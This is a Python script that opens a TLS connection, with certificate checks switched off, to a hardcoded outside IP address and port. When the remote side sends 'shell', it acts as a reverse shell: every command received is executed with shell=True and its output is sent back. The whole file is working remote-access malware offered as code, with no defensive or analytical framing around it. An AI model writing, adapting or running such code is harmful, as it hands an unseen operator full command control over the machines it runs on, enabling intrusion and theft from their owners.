import socket
import ssl
import threading
import sys
import os
import subprocess


def reverse_shell(socket):
    while True:
        command = socket.recv(4096).decode()
        if command.strip().lower() == 'exit':
            break
        try:
            if command.lower().startswith('cd '):
                directory = command[3:].strip()
                os.chdir(directory)
                output = f"Changed directory to {os.getcwd()}"
            else:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        except subprocess.CalledProcessError as e:
            output = e.output
            socket.send(output.encode())
            break
        except Exception as e:
            output = str(e)
            socket.send(output.encode())
            break
        
        socket.send(output.encode())


def receive_messages(secure_sock):
    while True:
        try:
            message = secure_sock.recv(4096).decode()
            if message == "shell":
                print("GETTING SHELL")
                reverse_shell(secure_sock)
            elif not message:
                print("Connection closed by the server.")
                break
            print(message)
        except Exception as e:
            print(f"Error receiving message: {e}")
            break


def connect_to_server(server_address, server_port):
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    secure_sock = context.wrap_socket(sock, server_hostname=server_address)
    
    try:
        print(f"Connecting to {server_address}:{server_port}...")
        secure_sock.connect((server_address, server_port))
        print(secure_sock.recv(1024).decode())

        receive_thread = threading.Thread(target=receive_messages, args=(secure_sock,))

        receive_thread.start()

        receive_thread.join()

    except ssl.SSLError as e:
        print(f"SSL error: {e}")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        secure_sock.close()

connect_to_server('141.145.217.152', 8888)
